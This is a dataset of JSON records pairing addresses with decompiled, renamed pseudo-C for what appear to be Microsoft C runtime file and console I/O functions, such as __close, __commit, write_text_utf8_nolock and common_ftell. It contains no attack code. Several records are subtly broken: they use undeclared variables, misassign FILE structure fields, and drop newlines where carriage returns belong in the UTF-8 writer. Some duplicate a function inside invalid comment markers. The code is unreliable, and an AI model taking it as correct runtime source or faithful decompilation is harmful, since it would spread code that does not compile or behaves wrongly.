{"Function Name": "___acrt_LCMapStringA", "Address": "1002e5f4", "Source Code": "void __cdecl\n___acrt_LCMapStringA\n(__acrt_ptd **param_1, wchar_t *param_2, ulong param_3, char *param_4, int param_5,\n char *param_6, int param_7, int param_8, int param_9)\n{\n    int local_14; \n    FUN_1001bfff(&local_14, param_1); \n    __acrt_LCMapStringA_stat(local_10, param_2, param_3, param_4, param_5, param_6, param_7, param_8, param_9); \n    \n    if (*(char *)(&local_14 + 0x350) != '\\0') {\n        *(uint *)(local_14 + 0x350) &= 0xfffffffd; \n    }\n    return; \n}"}
{"Function Name": "___acrt_stdio_free_buffer_nolock", "Address": "1002e6df", "Source Code": "void __cdecl ___acrt_stdio_free_buffer_nolock(undefined4 *buffer)\n{\n    uint *status_flags = buffer + 3; \n    \n    if (((*status_flags >> 0xd & 1) != 0) && ((*status_flags >> 6 & 1) != 0)) {\n        \n        FID_conflict__free((void *)buffer[1]);\n        LOCK(); \n        \n        *status_flags &= 0xfffffebf;\n        UNLOCK(); \n        \n        buffer[1] = 0; \n        *buffer = 0;   \n        buffer[2] = 0; \n    }\n}"}
{"Function Name": "__acrt_lowio_lock_fh_and_call<class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>_>", "Address": "1002e79f", "Source Code": "\\*\nint __cdecl\n__acrt_lowio_lock_fh_and_call<class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>_>\n(int param_1,<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> *param_2)\n{\n    \n    __crt_seh_guarded_call<int> local_5;\n    \n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_123407a5e2ac06da108355a851863b7a>,class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class_<lambda_ae55bdf541ad94d75914d381c370e64d>_>\n        (&local_5, \n        (<lambda_123407a5e2ac06da108355a851863b7a> *)&param_1, \n        param_2, \n        (<lambda_ae55bdf541ad94d75914d381c370e64d> *)&param_1); \n}\n*\\ \n \nint __cdecl\n__acrt_lowio_lock_fh_and_call<class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>_>\n(int param_1,<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> *param_2)\n{\n    __crt_seh_guarded_call<int> local_5;\n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_123407a5e2ac06da108355a851863b7a>,class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>&,class_<lambda_ae55bdf541ad94d75914d381c370e64d>_>\n        (&local_5,(<lambda_123407a5e2ac06da108355a851863b7a> *)&param_1,param_2,\n        (<lambda_ae55bdf541ad94d75914d381c370e64d> *)&param_1);\n}"}
{"Function Name": "__close", "Address": "1002e7c7", "Source Code": "int __cdecl __close(int file_handle)\n{\n    \n    if (file_handle == -2) {\n        \n        *(undefined4 *)get_memory_location_1() = 0;\n        \n        *(undefined4 *)get_memory_location_2() = 9;\n    } else {\n        \n        if (((-1 < file_handle) && ((uint)file_handle < max_file_handles)) &&\n            \n            ((*(byte *)((&file_status_array)[file_handle >> 6] + 0x28 + (file_handle & 0x3fU) * 0x30) & 1) != 0)) {\n            \n            return lock_file_handle_and_execute<class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec>_>\n            (file_handle, (class_<lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec> *)&file_handle);\n        }\n        \n        *(undefined4 *)get_memory_location_1() = 0;\n        \n        *(undefined4 *)get_memory_location_2() = 9;\n        \n        handle_file_close();\n    }\n    \n    return -1;\n}"}
{"Function Name": "__close_nolock", "Address": "1002e846", "Source Code": "int __cdecl __close_nolock(int file_handle)\n{\n    intptr_t os_file_handle; \n    DWORD error_code;    \n    os_file_handle = __get_osfhandle(file_handle); \n    if (os_file_handle != -1) { \n        \n        if (((file_handle == 1) && ((*(byte *)(DAT_10050088 + 0x88) & 1) != 0)) ||\n            (file_handle == 2 && ((*(byte *)(DAT_10050088 + 0x58) & 1) != 0)))) {\n            os_file_handle = __get_osfhandle(2); \n            if (os_file_handle == __get_osfhandle(1)) { \n                error_code = 0; \n                goto LAB_1002e8ae; \n            }\n        }\n        \n        if (CloseHandle((HANDLE)os_file_handle) == 0) { \n            error_code = GetLastError(); \n            goto LAB_1002e8ae; \n        }\n    }\n    error_code = 0; \nLAB_1002e8ae:\n    __free_osfhnd(file_handle); \n    \n    *(undefined *)((&DAT_10050088)[file_handle >> 6] + 0x28 + (file_handle & 0x3fU) * 0x30) = 0;\n    \n    return (error_code == 0) ? 0 : (__acrt_errno_map_os_error(error_code), -1);\n}"}
{"Function Name": "__acrt_stdio_free_stream", "Address": "1002e8e2", "Source Code": "void __cdecl __acrt_stdio_free_stream(undefined4 *stream_structure)\n{\n    \n    *stream_structure = 0;\n    \n    \n    stream_structure[1] = 0;\n    \n    \n    stream_structure[2] = 0;\n    \n    \n    stream_structure[3] = 0;\n    \n    \n    stream_structure[4] = 0xffffffff;\n    \n    \n    stream_structure[5] = 0;\n    \n    \n    stream_structure[6] = 0;\n    \n    \n    stream_structure[7] = 0;\n    \n    \n    LOCK();\n    \n    \n    UNLOCK();\n    \n    \n    return;\n}"}
{"Function Name": "__acrt_lowio_lock_fh_and_call<class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>_>", "Address": "1002e9b5", "Source Code": "\\*\nint __cdecl\n__acrt_lowio_lock_fh_and_call<class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>_>\n(int param_1,<lambda_6978c1fb23f02e42e1d9e99668cc68aa> *param_2)\n{\n    \n    __crt_seh_guarded_call<int> local_5;\n    \n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_61cee617f5178ae960314fd4d05640a0>,class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class_<lambda_9cd88cf8ad10232537feb2133f08c833>_>\n        (&local_5, \n        (class_<lambda_61cee617f5178ae960314fd4d05640a0> *)&param_1, \n        param_2, \n        (class_<lambda_9cd88cf8ad10232537feb2133f08c833> *)&param_1); \n}\n*\\ \n \nint __cdecl\n__acrt_lowio_lock_fh_and_call<class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>_>\n(int param_1,<lambda_6978c1fb23f02e42e1d9e99668cc68aa> *param_2)\n{\n    __crt_seh_guarded_call<int> local_5;\n    return __crt_seh_guarded_call<int>::\n        operator()<class_<lambda_61cee617f5178ae960314fd4d05640a0>,class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>&,class_<lambda_9cd88cf8ad10232537feb2133f08c833>_>\n        (&local_5, (class_<lambda_61cee617f5178ae960314fd4d05640a0> *)&param_1, param_2,\n        (class_<lambda_9cd88cf8ad10232537feb2133f08c833> *)&param_1);\n}"}
{"Function Name": "__commit", "Address": "1002e9dd", "Source Code": "int __cdecl __commit(int file_handle)\n{\n    undefined4 *pointer_to_value; \n    int integer_value; \n    \n    if (file_handle == -2) {\n        pointer_to_value = (undefined4 *)FUN_100253b8(); \n        *pointer_to_value = 9; \n    } else {\n        \n        if (((-1 < file_handle) && ((uint)file_handle < DAT_10050288)) &&\n            ((*(byte *)((&DAT_10050088)[file_handle >> 6] + 0x28 + (file_handle & 0x3fU) * 0x30) & 1) != 0)) {\n            \n            return __acrt_lowio_lock_fh_and_call<class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa>_>\n                (file_handle, (class_<lambda_6978c1fb23f02e42e1d9e99668cc68aa> *)&file_handle);\n        }\n        pointer_to_value = (undefined4 *)FUN_100253b8(); \n        *pointer_to_value = 9; \n        FUN_1001de96(); \n    }\n    return -1; \n}"}
{"Function Name": "FUN_1002ea4c", "Address": "1002ea4c", "Source Code": "void __cdecl FUN_1002ea4c(DWORD *param_1, uint param_2, byte *param_3, int param_4)\n{\n    HANDLE fileHandle; \n    byte *endOfSourceBuffer; \n    UINT consoleCodePage; \n    ushort *charTypeArray; \n    int tempIntVar; \n    uint wideCharToMultiByteResult; \n    BOOL writeFileResult; \n    DWORD lastErrorCode; \n    int fileHandleIndex; \n    byte *currentSourceChar; \n    byte *tempSourcePointer; \n    size_t sourceCharSizeInBytes; \n    uint bytesWritten; \n    byte *currentDestPosition; \n    wchar_t wideCharBuffer[2]; \n    CHAR multiByteOutputBuffer[8]; \n    undefined2 charState; \n    uint stackCookie; \n    stackCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    fileHandleIndex = (int)param_2 >> 6; \n    int offset = (param_2 & 0x3f) * 0x30; \n    fileHandle = *(HANDLE *)((&DAT_10050088)[fileHandleIndex] + 0x18 + offset); \n    endOfSourceBuffer = param_3 + param_4; \n    consoleCodePage = GetConsoleCP(); \n    *param_1 = 0; \n    param_1[1] = 0; \n    param_1[2] = 0; \n    if (param_3 < endOfSourceBuffer) { \n        currentDestPosition = param_3 + 1; \n        currentSourceChar = param_3; \n        do {\n            wideCharBuffer[0] = L'\\0'; \n            charState = CONCAT11(*currentSourceChar, (undefined)charState); \n            tempIntVar = (&DAT_10050088)[fileHandleIndex]; \n            byte bVar1 = *(byte *)(tempIntVar + 0x2d + offset); \n            if ((bVar1 & 4) == 0) { \n                charTypeArray = ___pctype_func(); \n                if ((charTypeArray[*currentSourceChar] & 0x8000) == 0) { \n                    sourceCharSizeInBytes = 1; \n                    tempSourcePointer = currentSourceChar; \n                    goto LAB_1002eb2b; \n                }\n                if (endOfSourceBuffer <= currentDestPosition) { \n                    *(byte *)((&DAT_10050088)[fileHandleIndex] + 0x2e + offset) = *currentSourceChar; \n                    endOfSourceBuffer = (byte *)((&DAT_10050088)[fileHandleIndex] + 0x2d + offset); \n                    *endOfSourceBuffer |= 4; \n                    param_1[1]++; \n                    break; \n                }\n                tempIntVar = _mbtowc(wideCharBuffer, (char *)currentSourceChar, 2); \n                if (tempIntVar == -1) break; \n                currentSourceChar++; \n                currentDestPosition++; \n            } else {\n                uint wideCharToMultiByteResult = CONCAT11(*currentSourceChar, bVar1) & 0xfffffffb; \n                sourceCharSizeInBytes = 2; \n                *(char *)(tempIntVar + 0x2d + offset) = (char)wideCharToMultiByteResult; \n                tempSourcePointer = &bVar1; \nLAB_1002eb2b:\n                tempIntVar = _mbtowc(wideCharBuffer, (char *)tempSourcePointer, sourceCharSizeInBytes); \n                if (tempIntVar == -1) break; \n            }\n            currentSourceChar++; \n            currentDestPosition++; \n            wideCharToMultiByteResult = WideCharToMultiByte(consoleCodePage, 0, wideCharBuffer, 1, multiByteOutputBuffer, 5, (LPCSTR)0x0, (LPBOOL)0x0); \n            if (wideCharToMultiByteResult == 0) break; \n            writeFileResult = WriteFile(fileHandle, multiByteOutputBuffer, wideCharToMultiByteResult, &bytesWritten, (LPOVERLAPPED)0x0); \n            if (writeFileResult == 0) { \nLAB_1002ebf6:\n                lastErrorCode = GetLastError(); \n                *param_1 = lastErrorCode; \n                break; \n            }\n            param_1[1] = (DWORD)(currentSourceChar + (param_1[2] - (int)param_3)); \n            if (bytesWritten < wideCharToMultiByteResult) break; \n            if (charState._1_1_ == '\\n') { \n                charState = 0xd; \n                writeFileResult = WriteFile(fileHandle, &charState, 1, &bytesWritten, (LPOVERLAPPED)0x0); \n                if (writeFileResult == 0) goto LAB_1002ebf6; \n                if (bytesWritten == 0) break; \n                param_1[2]++; \n                param_1[1]++; \n            }\n        } while (currentSourceChar < endOfSourceBuffer); \n    }\n    ___security_check_cookie_4(stackCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "write_double_translated_unicode_nolock", "Address": "1002ec11", "Source Code": "\\*\nDWORD * __cdecl write_double_translated_unicode_nolock(DWORD *outputStatus, wchar_t *inputString, int bufferSize)\n{\n    wchar_t currentWideChar; \n    wchar_t *endBufferPointer; \n    *outputStatus = 0; \n    outputStatus[1] = 0; \n    outputStatus[2] = 0; \n    endBufferPointer = (wchar_t *)(bufferSize + (int)inputString); \n    if (inputString < endBufferPointer) { \n        do {\n            currentWideChar = *inputString; \n            if (__putwch_nolock(currentWideChar) != currentWideChar) { \n                *outputStatus = GetLastError(); \n                return outputStatus; \n            }\n            outputStatus[1] += 2; \n            if (currentWideChar == L'\\n') { \n                if (__putwch_nolock(L'\\r') != 0xd) { \n                    *outputStatus = GetLastError(); \n                    return outputStatus; \n                }\n                outputStatus[1]++; \n                outputStatus[2]++; \n            }\n            inputString++; \n        } while (inputString < endBufferPointer); \n    }\n    return outputStatus; \n}\n*\\ \n \nDWORD * __cdecl write_double_translated_unicode_nolock(DWORD *outputStatus, wchar_t *inputString, int bufferSize)\n{\n    wchar_t currentWideChar;\n    wchar_t *endBufferPointer;\n    *outputStatus = 0;\n    outputStatus[1] = 0;\n    outputStatus[2] = 0;\n    endBufferPointer = (wchar_t *)(bufferSize + (int)inputString);\n    if (inputString < endBufferPointer) {\n        do {\n            currentWideChar = *inputString;\n            if (__putwch_nolock(currentWideChar) != currentWideChar) {\n                *outputStatus = GetLastError();\n                return outputStatus;\n            }\n            outputStatus[1] += 2;\n            if (currentWideChar == L'\\n') {\n                if (__putwch_nolock(L'\\r') != 0xd) {\n                    *outputStatus = GetLastError();\n                    return outputStatus;\n                }\n                outputStatus[1]++;\n                outputStatus[2]++;\n            }\n            inputString++;\n        } while (inputString < endBufferPointer);\n    }\n    return outputStatus;\n}"}
{"Function Name": "write_requires_double_translation_nolock", "Address": "1002ec7e", "Source Code": "bool __cdecl write_requires_double_translation_nolock(int file_descriptor)\n{\n    \n    if (__isatty(file_descriptor) == 0) {\n        return false; \n    }\n    \n    int index = file_descriptor >> 6; \n    int offset = (file_descriptor & 0x3fU) * 0x30; \n    \n    if ((*(byte *)((&DAT_10050088)[index] + 0x28 + offset) & 0x80) == 0 || \n        (FUN_10029224(), \n        *(int *)(*(int *)(p_Var2 + 0x4c) + 0xa8) == 0 && \n        (*(char *)((&DAT_10050088)[index] + 0x29 + offset) == '\\0'))) { \n        return false; \n    }\n    \n    BOOL console_mode = GetConsoleMode(*(HANDLE *)((&DAT_10050088)[index] + 0x18 + offset), NULL);\n    return console_mode != 0; \n}"}
{"Function Name": "write_text_ansi_nolock", "Address": "1002ecf4", "Source Code": "void __cdecl write_text_ansi_nolock(DWORD *param_1, uint param_2, char *param_3, int param_4)\n{\n    HANDLE fileHandle; \n    BOOL writeResult; \n    DWORD lastErrorCode; \n    char *bufferPointer; \n    uint bytesWritten; \n    char localBuffer[5120]; \n    \n    fileHandle = *(HANDLE *)((&DAT_10050088)[(int)param_2 >> 6] + 0x18 + (param_2 & 0x3f) * 0x30);\n    \n    \n    *param_1 = 0; \n    param_1[1] = 0; \n    param_1[2] = 0; \n    \n    char *inputEndPointer = param_3 + param_4; \n    do {\n        \n        if (inputEndPointer <= param_3) break;\n        \n        bufferPointer = localBuffer; \n        \n        do {\n            \n            if (inputEndPointer <= param_3) break;\n            \n            char currentChar = *param_3++; \n            if (currentChar == '\\n') { \n                param_1[2]++; \n                *bufferPointer++ = '\\r'; \n            }\n            *bufferPointer++ = currentChar; \n        } while (bufferPointer < localBuffer + 0x13ff); \n        \n        \n        writeResult = WriteFile(fileHandle, localBuffer, (int)bufferPointer - (int)localBuffer, &bytesWritten, (LPOVERLAPPED)0x0);\n        \n        \n        if (writeResult == 0) {\n            lastErrorCode = GetLastError(); \n            *param_1 = lastErrorCode; \n            break; \n        }\n        \n        param_1[1] += bytesWritten; \n    } while ((uint)((int)bufferPointer - (int)localBuffer) <= bytesWritten); \n    \n    return; \n}"}
{"Function Name": "FUN_1002edd3", "Address": "1002edd3", "Source Code": "void __cdecl FUN_1002edd3(DWORD *param_1, uint param_2, short *param_3, int param_4)\n{\n    short currentChar; \n    HANDLE fileHandle; \n    BOOL writeResult; \n    DWORD lastErrorCode; \n    short *bufferPointer; \n    uint bytesWritten; \n    short localBuffer[2560]; \n    uint stackProtection; \n    \n    stackProtection = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    fileHandle = *(HANDLE *)((&DAT_10050088)[(int)param_2 >> 6] + 0x18 + (param_2 & 0x3f) * 0x30);\n    \n    param_1[0] = 0; \n    param_1[1] = 0; \n    param_1[2] = 0; \n    do {\n        \n        if (param_3 + param_4 <= param_3) break;\n        bufferPointer = localBuffer; \n        do {\n            \n            if (param_3 + param_4 <= param_3) break;\n            currentChar = *param_3++; \n            \n            if (currentChar == 10) {\n                param_1[2] += 2; \n                *bufferPointer++ = 0xd; \n            }\n            *bufferPointer++ = currentChar; \n        } while (bufferPointer < localBuffer + 0x9ff); \n        \n        writeResult = WriteFile(fileHandle, localBuffer, (int)bufferPointer - (int)localBuffer, &bytesWritten, (LPOVERLAPPED)0x0);\n        \n        if (writeResult == 0) {\n            lastErrorCode = GetLastError(); \n            *param_1 = lastErrorCode; \n            break; \n        }\n        param_1[1] += bytesWritten; \n    } while ((uint)((int)bufferPointer - (int)localBuffer) <= bytesWritten); \n    \n    ___security_check_cookie_4(stackProtection ^ (uint)&stack0xfffffffc);\n    return; \n}"}
{"Function Name": "write_text_utf8_nolock", "Address": "1002eec1", "Source Code": "void __cdecl write_text_utf8_nolock(DWORD *error_code, uint file_index, WCHAR *input_wide_string, int input_length)\n{\n    WCHAR *local_buffer_ptr; \n    uint bytes_converted; \n    BOOL write_success; \n    DWORD last_error_code; \n    uint bytes_written; \n    WCHAR *input_wide_ptr; \n    DWORD bytes_written_by_writefile; \n    HANDLE file_handle; \n    WCHAR *input_wide_end_ptr; \n    CHAR utf8_buffer[3416]; \n    WCHAR processed_wide_buffer[854]; \n    \n    file_handle = *(HANDLE *)((&DAT_10050088)[(int)file_index >> 6] + 0x18 + (file_index & 0x3f) * 0x30);\n    \n    input_wide_end_ptr = (WCHAR *)(input_length + (int)input_wide_string);\n    \n    *error_code = 0;\n    error_code[1] = 0;\n    error_code[2] = 0;\n    input_wide_ptr = input_wide_string; \n    \n    if (input_wide_string < input_wide_end_ptr) {\n        do {\n            bytes_written = 0; \n            local_buffer_ptr = processed_wide_buffer; \n            do {\n                \n                if (input_wide_end_ptr <= input_wide_ptr) break;\n                \n                *local_buffer_ptr++ = (*input_wide_ptr == L'\\n') ? L'\\r' : *input_wide_ptr;\n                input_wide_ptr++; \n            } while (local_buffer_ptr < processed_wide_buffer + 0x354); \n            \n            bytes_converted = WideCharToMultiByte(0xfde9, 0, processed_wide_buffer, (int)local_buffer_ptr - (int)processed_wide_buffer >> 1, utf8_buffer, 0xd55, (LPCSTR)0x0, (LPBOOL)0x0);\n            \n            if (bytes_converted == 0) {\n                last_error_code = GetLastError(); \n                *error_code = last_error_code; \n                break; \n            }\n            do {\n                \n                write_success = WriteFile(file_handle, utf8_buffer + bytes_written, bytes_converted - bytes_written, &bytes_written_by_writefile, (LPOVERLAPPED)0x0);\n                \n                if (write_success == 0) {\n                    last_error_code = GetLastError(); \n                    *error_code = last_error_code; \n                    break; \n                }\n                bytes_written += bytes_written_by_writefile; \n            } while (bytes_written < bytes_converted); \n            \n            error_code[1] = (int)input_wide_ptr - (int)input_wide_string;\n        } while (input_wide_ptr < input_wide_end_ptr); \n    }\n    return; \n}"}
{"Function Name": "common_refill_and_read_nolock<char>", "Address": "1002f2f2", "Source Code": "\\*\nuint __cdecl common_refill_and_read_nolock<char>(FILE *file_pointer)\n{\n    byte byte_read; \n    int file_descriptor; \n    char *buffer_pointer; \n    uint buffer_size; \n    void *destination_buffer; \n    \n    if (file_pointer == (FILE *)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n    }\n    \n    else if ((((uint)file_pointer->_flag >> 0xd & 1) != 0) && (((uint)file_pointer->_flag >> 0xc & 1) == 0)) {\n        \n        if (((uint)file_pointer->_flag >> 1 & 1) == 0) {\n            LOCK(); \n            file_pointer->_flag |= 1; \n            UNLOCK(); \n            \n            if ((file_pointer->_flag & 0x4c0U) == 0) {\n                ___acrt_stdio_allocate_buffer_nolock(&file_pointer->_ptr); \n            }\n            file_pointer->_ptr = (char *)file_pointer->_cnt; \n            buffer_size = file_pointer->_bufsiz; \n            destination_buffer = (void *)file_pointer->_cnt; \n            file_descriptor = __fileno(file_pointer); \n            buffer_pointer = (char *)__read(file_descriptor, destination_buffer, buffer_size); \n            file_pointer->_base = buffer_pointer; \n            \n            if (buffer_pointer != (char *)0x0 && buffer_pointer != (char *)0xffffffff) {\n                \n                if ((file_pointer->_flag & 6U) == 0) {\n                    file_descriptor = __fileno(file_pointer); \n                    undefined *attribute_pointer = (file_descriptor == -1 || file_descriptor == -2) ? &DAT_1004e2b8 : (undefined *)((&DAT_10050088)[file_descriptor >> 6] + (__fileno(file_pointer) & 0x3f) * 0x30);\n                    \n                    if ((attribute_pointer[0x28] & 0x82) == 0x82) {\n                        LOCK(); \n                        file_pointer->_flag |= 0x20; \n                        UNLOCK(); \n                    }\n                }\n                \n                if ((file_pointer->_bufsiz == 0x200) && (((uint)file_pointer->_flag >> 6 & 1) != 0) && ((file_pointer->_flag & 0x100U) == 0)) {\n                    file_pointer->_bufsiz = 0x1000; \n                }\n                file_pointer->_base--; \n                byte_read = *file_pointer->_ptr++; \n                return (uint)byte_read; \n            }\n            LOCK(); \n            file_pointer->_flag |= 8 + (uint)(buffer_pointer != (char *)0x0) * 8; \n            UNLOCK(); \n            file_pointer->_base = (char *)0x0; \n        }\n        LOCK(); \n        file_pointer->_flag |= 0x10; \n        UNLOCK(); \n    }\n    return 0xffffffff; \n}\n*\\ \n \nuint __cdecl common_refill_and_read_nolock<char>(FILE *file_pointer)\n{\n    byte byte_read;\n    int file_descriptor;\n    char *buffer_pointer;\n    uint buffer_size;\n    void *destination_buffer;\n    if (file_pointer == (FILE *)0x0) {\n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n    }\n    else if ((((uint)file_pointer->_flag >> 0xd & 1) != 0) && (((uint)file_pointer->_flag >> 0xc & 1) == 0)) {\n        if (((uint)file_pointer->_flag >> 1 & 1) == 0) {\n            LOCK();\n            file_pointer->_flag |= 1;\n            UNLOCK();\n            if ((file_pointer->_flag & 0x4c0U) == 0) {\n                ___acrt_stdio_allocate_buffer_nolock(&file_pointer->_ptr);\n            }\n            file_pointer->_ptr = (char *)file_pointer->_cnt;\n            buffer_size = file_pointer->_bufsiz;\n            destination_buffer = (void *)file_pointer->_cnt;\n            file_descriptor = __fileno(file_pointer);\n            buffer_pointer = (char *)__read(file_descriptor, destination_buffer, buffer_size);\n            file_pointer->_base = buffer_pointer;\n            if (buffer_pointer != (char *)0x0 && buffer_pointer != (char *)0xffffffff) {\n                if ((file_pointer->_flag & 6U) == 0) {\n                    file_descriptor = __fileno(file_pointer);\n                    undefined *attribute_pointer = (file_descriptor == -1 || file_descriptor == -2) ? &DAT_1004e2b8 : (undefined *)((&DAT_10050088)[file_descriptor >> 6] + (__fileno(file_pointer) & 0x3f) * 0x30);\n                    if ((attribute_pointer[0x28] & 0x82) == 0x82) {\n                        LOCK();\n                        file_pointer->_flag |= 0x20;\n                        UNLOCK();\n                    }\n                }\n                if ((file_pointer->_bufsiz == 0x200) && (((uint)file_pointer->_flag >> 6 & 1) != 0) && ((file_pointer->_flag & 0x100U) == 0)) {\n                    file_pointer->_bufsiz = 0x1000;\n                }\n                file_pointer->_base--;\n                byte_read = *file_pointer->_ptr++;\n                return (uint)byte_read;\n            }\n            LOCK();\n            file_pointer->_flag |= 8 + (uint)(buffer_pointer != (char *)0x0) * 8;\n            UNLOCK();\n            file_pointer->_base = (char *)0x0;\n        }\n        LOCK();\n        file_pointer->_flag |= 0x10;\n        UNLOCK();\n    }\n    return 0xffffffff;\n}"}
{"Function Name": "FUN_1002f475", "Address": "1002f475", "Source Code": "void __cdecl FUN_1002f475(FILE *file_pointer)\n{\n    \n    \n    common_refill_and_read_nolock<char>(file_pointer);\n}"}
{"Function Name": "common_ftell<__int64>", "Address": "1002f480", "Source Code": "\\*\nlonglong __cdecl common_ftell<__int64>(FILE *file_pointer)\n{\n    longlong return_value; \n    if (file_pointer == (FILE *)0x0) { \n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8(); \n        *error_code_pointer = 0x16; \n        FUN_1001de96(); \n        return_value = -1; \n    }\n    else { \n        __lock_file(file_pointer); \n        return_value = FUN_1002f4fc(file_pointer); \n        FUN_1002f4f2(); \n    }\n    return return_value; \n}\n*\\ \n \nlonglong __cdecl common_ftell<__int64>(FILE *file_pointer)\n{\n    longlong return_value;\n    if (file_pointer == (FILE *)0x0) {\n        undefined4 *error_code_pointer = (undefined4 *)FUN_100253b8();\n        *error_code_pointer = 0x16;\n        FUN_1001de96();\n        return_value = -1;\n    }\n    else {\n        __lock_file(file_pointer);\n        return_value = FUN_1002f4fc(file_pointer);\n        FUN_1002f4f2();\n    }\n    return return_value;\n}"}
{"Function Name": "FUN_1002f4fc", "Address": "1002f4fc", "Source Code": "longlong __cdecl FUN_1002f4fc(FILE *file_pointer) \n{\n    uint file_descriptor; \n    longlong seek_result; \n    longlong current_position; \n    __int64 unused_variable; \n    if (file_pointer == (FILE *)0x0) { \n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        return -1; \n    }\n    file_descriptor = __fileno(file_pointer); \n    if ((int)file_pointer->_base < 0) { \n        file_pointer->_base = (char *)0x0; \n    }\n    seek_result = __lseeki64(file_descriptor, 0x100000000, 0); \n    if ((seek_result < 0x100000000) && (seek_result < 0)) { \n        return -1; \n    }\n    if ((file_pointer->_flag & 0xc0U) == 0) { \n        return seek_result - (int)file_pointer->_base; \n    }\n    int flag_index = (int)file_descriptor >> 6; \n    int flag_offset = (file_descriptor & 0x3f) * 0x30; \n    char flag_value = *(char *)(flag_offset + 0x29 + (&DAT_10050088)[flag_index]); \n    current_position = (longlong)((int)file_pointer->_ptr - file_pointer->_cnt); \n    if ((file_pointer->_flag & 3U) == 0) { \n        if (((uint)file_pointer->_flag >> 2 & 1) == 0) { \n            *(undefined4 *)FUN_100253b8() = 0x16; \n            return -1; \n        }\n    } else {\n        if ((flag_value == '\\x01') && ((*(byte *)(flag_offset + 0x2d + (&DAT_10050088)[flag_index]) & 2) != 0)) { \n            return common_ftell_translated_utf8_nolock(file_pointer, (int)seek_result, (uint)((ulonglong)seek_result >> 0x20)); \n        }\n        if ((*(byte *)(flag_offset + 0x28 + (&DAT_10050088)[flag_index]) & 0x80) != 0) { \n            current_position += count_newline_bytes((char *)file_pointer->_cnt, file_pointer->_ptr, (undefined4)0); \n        }\n    }\n    if (seek_result != 0) { \n        if ((file_pointer->_flag & 1U) == 0) { \n            if (flag_value == '\\x01') { \n                current_position = __alldiv((uint)current_position, (uint)((ulonglong)current_position >> 0x20), 2, 0); \n            }\n            current_position += seek_result; \n        } else {\n            current_position = FUN_1002f6a2(file_pointer, (int)seek_result, (uint)((ulonglong)seek_result >> 0x20), (uint)current_position, (uint)((ulonglong)current_position >> 0x20)); \n        }\n    }\n    return current_position; \n}"}
{"Function Name": "FUN_1002f6a2", "Address": "1002f6a2", "Source Code": "longlong __cdecl\nFUN_1002f6a2(FILE *param_1, undefined4 param_2, uint param_3, uint param_4, uint param_5)\n{\n    longlong lVar2; \n    char cVar3; \n    uint _FileHandle; \n    int iVar4; \n    uint uVar5; \n    int iVar6; \n    int iVar7; \n    longlong lVar10; \n    __int64 _Var11; \n    longlong lVar12; \n    uint local_8 = 2; \n    lVar2 = CONCAT44(param_3, param_2); \n    _FileHandle = __fileno(param_1); \n    iVar4 = (_FileHandle & 0x3f) * 0x30; \n    cVar3 = *(char *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x29 + iVar4); \n    if (cVar3 != '\\x01') { \n        local_8 = 1; \n    }\n    \n    char *pcVar1 = param_1->_base; \n    if (pcVar1 != (char *)0x0) { \n        uVar5 = (int)param_1->_ptr - param_1->_cnt; \n        char *pcVar8 = pcVar1 + uVar5; \n        iVar6 = ((int)uVar5 >> 0x1f) + ((int)pcVar1 >> 0x1f) + (uint)CARRY4(uVar5, (uint)pcVar1); \n        lVar12 = CONCAT44(iVar6, pcVar8); \n        \n        if ((*(byte *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x28 + iVar4) & 0x80) != 0) { \n            lVar10 = __lseeki64(_FileHandle, 0x200000000, 0); \n            if (lVar10 == lVar2) { \n                _Var11 = count_newline_bytes((char *)param_1->_cnt, (char *)param_1->_cnt + (int)pcVar8, CONCAT31(0, cVar3)); \n                lVar12 += _Var11; \n            } else {\n                lVar12 = __lseeki64(_FileHandle, (ulonglong)param_3, 0); \n                if (lVar12 == -1) { \n                    return -1; \n                }\n                if (((iVar6 < 1) && (((iVar6 < 0 || (pcVar8 < (char *)0x201)) && (((uint)param_1->_flag >> 6 & 1) != 0)))) && (((uint)param_1->_flag >> 8 & 1) == 0)) { \n                    iVar6 = 0x200; \n                    iVar7 = 0; \n                } else {\n                    iVar6 = param_1->_bufsiz; \n                    iVar7 = iVar6 >> 0x1f; \n                }\n                lVar12 = CONCAT44(iVar7, iVar6); \n            }\n        }\n        \n        if ((*(byte *)((&DAT_10050088)[(int)_FileHandle >> 6] + 0x28 + iVar4) & 4) == 0) { \n            cVar3 = FUN_1002f681(cVar3); \n            lVar12 += (ulonglong)CONCAT31(0, cVar3); \n        }\n    }\n    \n    lVar12 = __alldiv((uint)lVar12, (uint)((ulonglong)lVar12 >> 0x20), local_8, 0); \n    lVar10 = __alldiv(param_4, param_5, local_8, 0); \n    lVar2 = (lVar10 - lVar12) + lVar2; \n    return lVar2; \n}"}
